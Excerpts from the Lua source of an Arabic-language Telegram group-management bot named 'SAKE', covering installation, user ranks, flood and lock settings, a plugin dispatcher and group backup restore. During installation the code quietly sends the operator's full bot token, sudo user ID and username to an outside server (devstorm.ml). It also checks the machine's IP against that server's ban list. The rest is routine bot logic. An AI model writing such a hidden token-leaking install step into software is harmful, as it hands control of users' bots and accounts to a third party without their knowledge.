...
if not Token then
local infoo = io.popen('curl -s https://devstorm.ml/SAKE/api.php?ip='..io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')):read('*a')
if infoo:match('true') then
print('\27[31m! Error is Ban server \n السيرفر محظور من التنصيب" !\n\27[39m')
os.exit()
end
...
https.request('https://devstorm.ml/SAKE/insert/?id='..SUDO_USER..'&username=@'..GetUser.result.username:gsub('_',[[\_]])..'&token='..Token)
SAKE = Token:match("(%d+)")
redis:set(SAKE..":VERSION",2.9)
redis:set(SAKE..":SUDO_ID:",SUDO_USER)
redis:set(SAKE..":DataCenter:",'German')
redis:set(SAKE..":UserNameBot:",BOT_User)
redis:set(SAKE..":NameBot:",BOT_NAME)
redis:hset(SAKE..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
redis:set("TH3SAKE_INSTALL","Yes")
...
SAKE = Token:match("(%d+)")
our_id = tonumber(SAKE)
ApiSAKE = redis:get(SAKE..":ApiSource")
ApiToken = "https://api.telegram.org/bot"..Token
Bot_User = redis:get(SAKE..":UserNameBot:")
SUDO_ID = tonumber(redis:get(SAKE..":SUDO_ID:"))
if not SUDO_ID then io.popen("rm -fr ./inc/Token.txt") end
SUDO_USER = redis:hgetall(SAKE..'username:'..SUDO_ID).username
version = redis:get(SAKE..":VERSION")
DataCenter = redis:get(SAKE..":DataCenter:")
...
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..SAKE..')\027[0;32m\n'
...
if not redis:get(SAKE..":Check_Bot:"..W) then
Rgz,res=https.request(ApiSAKE..Tkml..W)
if res == 200 and Rgz == "SendMsg" then redis:setex(SAKE..":Check_Bot:"..W,1800,true) return false else return Rgz end 
end 
end
...
if msg.type == "pv" and redis:get(SAKE..':mute_pv:'..msg.sender_user_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end
if msg.type ~= "pv" and redis:get(SAKE..'sender:'..msg.sender_user_id_..':'..msg.chat_id_..'flood') then
print("\27[1;31mThis Flood Sender ...\27[0")
Del_msg(msg.chat_id_,msg.id_)
return false
end
if redis:get(SAKE..'group:add'..msg.chat_id_) then 
...
and redis:get(SAKE.."lock_cleaner"..msg.chat_id_) then
print("Clener >>> ")
redis:sadd(SAKE..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
Timerr = redis:get(SAKE..':Timer_Cleaner:'..msg.chat_id_)
if Timerr then 
Timerr = tonumber(Timerr)
Timerr = 60*60*Timerr
end
redis:setex(SAKE..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true)  
end
...
if not redis:get(SAKE..":SetTimerCleaner:"..msg.chat_id_..v) then
Del_msg(msg.chat_id_,v)
redis:srem(SAKE..":IdsMsgsCleaner:"..msg.chat_id_,v)
...
if msg.GroupActive and redis:get(SAKE..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
end
return false 
end 
...
msg.TheRankCmd = redis:get(SAKE..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
msg.TheRank = redis:get(SAKE..":RtbaNew1:"..msg.chat_id_) or 'مطور اساسي 👨🏻‍✈️' 
msg.Rank = 1
elseif redis:sismember(SAKE..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(SAKE..":RtbaNew2:"..msg.chat_id_) or 'المطور'
msg.TheRank = redis:get(SAKE..":RtbaNew2:"..msg.chat_id_) or 'مطور البوت 👨🏽‍💻'
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(SAKE..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(SAKE..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي'
msg.TheRank = redis:get(SAKE..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي 👲🏼'
msg.Rank = 11
elseif msg.GroupActive and redis:sismember(SAKE..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(SAKE..":RtbaNew4:"..msg.chat_id_) or 'المنشىء'
msg.TheRank = redis:get(SAKE..":RtbaNew4:"..msg.chat_id_) or 'المنشىء 👷🏽'
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(SAKE..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(SAKE..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
msg.TheRank = redis:get(SAKE..":RtbaNew5:"..msg.chat_id_) or 'مدير البوت 👨🏼‍⚕️' 
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(SAKE..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(SAKE..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
msg.TheRank = redis:get(SAKE..":RtbaNew6:"..msg.chat_id_) or 'ادمن في البوت 👨🏼‍🎓'
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(SAKE..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRank = redis:get(SAKE..":RtbaNew7:"..msg.chat_id_) or 'عضو مميز'
msg.Rank = 6
...
local lock_bots = redis:get(SAKE..'lock_bots'..msg.chat_id_)
ZISBOT = false
...
if msg.GroupActive and ZISBOT and redis:get(SAKE..'lock_bots_by_kick'..msg.chat_id_) then
kick_user(msg.sender_user_id_, msg.chat_id_)
end
if msg.content_.members_[0].id_ == our_id and redis:get(SAKE..':WELCOME_BOT') then
SUDO_USER = redis:hgetall(SAKE..'username:'..SUDO_ID).username
sendPhoto(msg.chat_id_,msg.id_,redis:get(SAKE..':WELCOME_BOT'),[[💯¦ مـرحبآ آنآ بوت آسـمـي ]]..redis:get(SAKE..':NameBot:')..[[ 🎖
...
if not msg.Special and not msg.Admin and redis:get(SAKE.."lock_Add"..msg.chat_id_) then
...
if redis:get(SAKE.."lock_check"..msg.chat_id_) and not redis:get(SAKE..":TqeedUser:"..msg.chat_id_..Senderid) then
...
if msg.Special or msg.Admin then redis:srem(SAKE..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
...
if msg.Special then redis:srem(SAKE..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
...
if redis:get(SAKE..'mute_text'..msg.chat_id_) then --قفل الدردشه
...
if ScriptFile and ScriptFile.SAKE then 
if msg.text and ScriptFile.iSAKE then
XSAKE = ScriptFile.SAKE
local list = redis:hgetall(SAKE..":AwamerBotArray:"..msg.chat_id_)
for SAKE2,k in pairs(list) do
Text = msg.text
Text2 = k
if Text:match(SAKE2) then 
local amrr = {Text:match(SAKE2)}
local AmrOld = redis:hgetall(SAKE..":AwamerBotArray2:"..msg.chat_id_)
amrnew = "" amrold = ""
...
GetMsg = ScriptFile.iSAKE(msg,{Text:match(Text2)})
if GetMsg then
...
Text = Text:gsub("ک","ك")
Text = Text:gsub("ه‍","ه")
if Text:match(SAKE) then -- Check Commands To admin
AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
GetMsg = ScriptFile.iSAKE(msg,{Text:match(SAKE)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",SAKE.." | Plugin is: \27[1;32mScript.lua\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
return false
end 
end
...
if ScriptFile.dSAKE then
if ScriptFile.dSAKE(msg) == false then
return false
end
...
if Plug.SAKE then 
if msg.text and Plug.iSAKE then
for k, SAKE in pairs(Plug.SAKE) do
if msg.text:match(SAKE) then
local GetMsg = Plug.iSAKE(msg,{msg.text:match(SAKE)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",SAKE.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
...
print("The File "..name.." Not Runing in The Source SAKE")
end 

end
else
print("The File Script.lua Not Runing in The Source SAKE")
end
end
...
redis:srem(SAKE..'users',msg.sender_user_id_)
end
...
if redis:get(SAKE..":propin"..msg.chat_id_) == msg.content_.text_ then
redis:del(SAKE..":propin"..msg.chat_id_)
...
if redis:get(SAKE..'group:add'..data.chat_.id_) then
redis:set(SAKE..'group:name'..data.chat_.id_,data.chat_.title_)
end
elseif data.ID == "UpdateChannel" then  
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
if redis:get(SAKE..'group:add-100'..data.channel_.id_) then
local linkGroup = (redis:get(SAKE..'linkGroup-100'..data.channel_.id_) or "")
local NameGroup = (redis:get(SAKE..'group:name-100'..data.channel_.id_) or "")
...
redis:mset(
SAKE..'group:name'..k,IDS.Title,
SAKE..'num_msg_max'..k,5,
SAKE..'group:add'..k,true,
SAKE..'lock_link'..k,true,
SAKE..'lock_spam'..k,true,
SAKE..'lock_webpage'..k,true,
SAKE..'lock_markdown'..k,true,
SAKE..'lock_flood'..k,true,
SAKE..'lock_bots'..k,true,
SAKE..'mute_forward'..k,true,
SAKE..'mute_contact'..k,true,
SAKE..'mute_document'..k,true,
SAKE..'mute_inline'..k,true,
SAKE..'lock_username'..k,true,
SAKE..'replay'..k,true
)
redis:sadd(SAKE..'group:ids',k) 

if IDS.Admins then
for user,ID in pairs(IDS.Admins) do
redis:hset(SAKE..'username:'..ID,'username',user)
redis:sadd(SAKE..'admins:'..k,ID)
end
end
if IDS.Creator then
for user,ID in pairs(IDS.Creator) do
redis:hset(SAKE..'username:'..ID,'username',user)
redis:sadd(SAKE..':MONSHA_BOT:'..k,ID)
end
end
if IDS.Owner then
for user,ID in pairs(IDS.Owner) do
redis:hset(SAKE..'username:'..ID,'username',user)
redis:sadd(SAKE..'owners:'..k,ID)
end
end
end
io.popen("rm -fr ../.telegram-cli/data/document/*")
sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'📦*¦* تم رفع آلنسـخهہ‏‏ آلآحتيآطـيهہ\n⚖️*¦* حآليآ عدد مـجمـوعآتگ هہ‏‏يهہ‏‏ *'..redis:scard(SAKE..'group:ids')..'* 🌿\n✓')
end
elseif data.ID == "UpdateUser" then  
if data.user_.type_.ID == "UserTypeDeleted" then
print("¦ userTypeDeleted")
redis:srem(SAKE..'users',data.user_.id_)
elseif data.user_.type_.ID == "UserTypeGeneral" then
local CheckUser = redis:hgetall(SAKE..'username:'..data.user_.id_).username
...
redis:hset(SAKE..'username:'..data.user_.id_,'username',USERNAME)
end 
end
